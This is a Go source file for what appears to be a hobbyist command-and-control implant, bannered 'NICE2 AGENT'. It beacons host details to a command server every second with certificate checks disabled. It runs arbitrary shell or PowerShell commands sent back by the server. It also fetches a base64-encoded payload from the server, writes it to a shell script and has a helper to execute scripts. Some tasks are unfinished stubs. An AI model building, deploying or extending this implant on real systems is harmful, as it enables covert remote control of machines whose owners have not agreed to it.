package main

import (
	"bytes"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"time"

	// "io/ioutil"
	b64 "encoding/base64"
	"log"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"strings"

	"github.com/denisbrodbeck/machineid"
	// "github.com/mitchellh/go-homedir"
)

// Setting the command server
// var command_server string = "http://192.168.0.69:8081"

var command_server string = "https://localhost:8081"

// var command_server string = "http://192.168.0.29:8081"

// Variables assigned later
var NodeID string = "" // This will be a GUID at some point

type CheckIn struct {
	ID       string `json:"ID"`
	Hostname string `json: "Hostname"`
	Platform string `json:"Platform"`
}

type CheckIn_response struct {
	TaskID string `json:"taskID"`
	Task   string `json:"task"`
	Arg    string `json:"arg"`
}

type command struct {
	ID      string `json:"ID"`
	Command string `json:"command"`
	Details string `json:"details"`
}

// Checking errors
func check(e error) {
	if e != nil {
		panic(e)
	}
}

// global stuff for shortcuts
var p = fmt.Println

func main() {

	Banner := `
███████████████████████████████████████████████████████████████████████████████████████████████
███    ██ ██  ██████ ███████  ██████ ██████       █████   ██████  ███████ ███    ██ ████████  
████   ██ ██ ██      ██      ██           ██     ██   ██ ██       ██      ████   ██    ██    
██ ██  ██ ██ ██      █████   ██       █████      ███████ ██   ███ █████   ██ ██  ██    ██    
██  ██ ██ ██ ██      ██      ██      ██          ██   ██ ██    ██ ██      ██  ██ ██    ██    
██   ████ ██  ██████ ███████  ██████ ███████     ██   ██  ██████  ███████ ██   ████    ██    
███████████████████████████████████████████████████████████████████████████████████████████████                                                                                                                                                                                       
`

	fmt.Println(Banner)

	NodeID, _ = machineid.ID()
	// NodeID = "THis is a test 99"

	// Checks in every 10 seconds.
	for {
		time.Sleep(1 * time.Second)

		checkIn()

	}

	// checkIn()

}

func checkIn() {

	// This allows us to use a self signed certificate.
	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}

	// Getting the info
	hostname, _ := os.Hostname()
	platform := runtime.GOOS

	data := map[string]string{"ID": NodeID, "Hostname": hostname, "Platform": platform}

	json_data, err := json.Marshal(data)
	if err != nil {
		log.Fatal(err)
	}

	r, err := http.NewRequest("POST", command_server+"/checkin", bytes.NewBuffer(json_data))
	if err != nil {
		panic(err)
	}

	// Add the header to say that it's json
	r.Header.Add("Content-Type", "application/json")

	//Create a client to send the data and then send it
	client := &http.Client{}
	res, err := client.Do(r)
	if err != nil {
		panic(err)
	}

	//shrug
	defer res.Body.Close()

	// Bit of UI for you
	if res.StatusCode == 200 {
		fmt.Println("Response was OK")
	} else {
		fmt.Println("Response was Not OK")
	}

	post := &CheckIn_response{}
	derr := json.NewDecoder(res.Body).Decode(post)
	if derr != nil {
		fmt.Println("Error decoding the JSON")
		panic(derr)
	}

	fmt.Println("Details of response")
	fmt.Println("Task: " + post.Task)
	fmt.Println("Arg: " + post.Arg)

	// Handeling it if there is no new task
	if post.TaskID == "0" {
		fmt.Println("No new task")
		return
	}

	// This is is where the tasks that the node should then do need to go
	switch post.Task {
	case "run script":
		fmt.Println("Hello there")
	case "shutdown":
		shutdown()
	case "run command":
		runCommand(post.Arg)
	default:
		// Well if it doesn't match 🤷‍♀️

	}

}

func shutdown() {

	fmt.Println("Beep Boop. The computer should now shut down")

	/// This is where the code to shutdown the PC will go
}

func getFIle() {

	fmt.Println("\nStarting the getting file thing")

	data := map[string]string{"ID": NodeID}

	json_data, err := json.Marshal(data)
	if err != nil {
		log.Fatal(err)
	}

	r, err := http.NewRequest("POST", command_server+"/old-payload", bytes.NewBuffer(json_data))
	if err != nil {
		panic(err)
	}

	// Add the header to say that it's json
	r.Header.Add("Content-Type", "application/json")

	//Create a client to send the data and then send it
	client := &http.Client{}
	res, err := client.Do(r)
	if err != nil {
		panic(err)
	}

	//shrug
	defer res.Body.Close()

	fmt.Println(res.StatusCode)

	// Parse the JSON response
	post := &command{}

	fmt.Println(1)
	derr := json.NewDecoder(res.Body).Decode(post)
	if derr != nil {
		panic(derr)
	}

	// Decoding the body so it's readable
	details, _ := b64.StdEncoding.DecodeString(post.Details)
	fmt.Println(string(details))

	// Output the JSON response
	fmt.Println("ID: ", post.ID)
	fmt.Println("Command: ", post.Command)
	fmt.Println("Details: ", string(details))

	// Write the string to file
	script_to_file(string(details))

}

func runCommand(command string) (outString string, errorMessage string) {

	var shell string
	errorMessage = ""

	// Selecting which shell to use
	if runtime.GOOS == "windows" {
		shell = "powershell.exe"
	} else {
		shell = "sh"
	}

	// Change directory
	if strings.HasPrefix(command, "cd ") {

		dir := command[3:] // get the first three chars

		os.Chdir(dir)

		p(dir)

		// run command, and if it causes an error create an error
		out, err := exec.Command(shell, "-c", "pwd").Output()
		if err != nil {
			p(err.Error())
			errorMessage = err.Error()

			return
		}

		outString = string(out)
		return
	}

	// run command, and if it causes an error create an error
	out, err := exec.Command(shell, "-c", command).Output()
	if err != nil {
		p(err.Error())
		errorMessage = err.Error()

		return
	}

	outString = string(out)

	return

}

func script_to_file(input string) {

	f, err := os.Create("payloads/shell.sh")

	if err != nil {
		log.Fatal(err)
	}

	defer f.Close()

	data := []byte(input)

	_, err2 := f.Write(data)

	if err2 != nil {
		log.Fatal(err2)
	}

	return
}

func run_script(path_to_script string) (output string) {

	output = ""

	out, err := exec.Command("sh", path_to_script).Output()
	if err != nil {
		fmt.Println("Error executing script")
	}

	output = string(out)

	return output

}
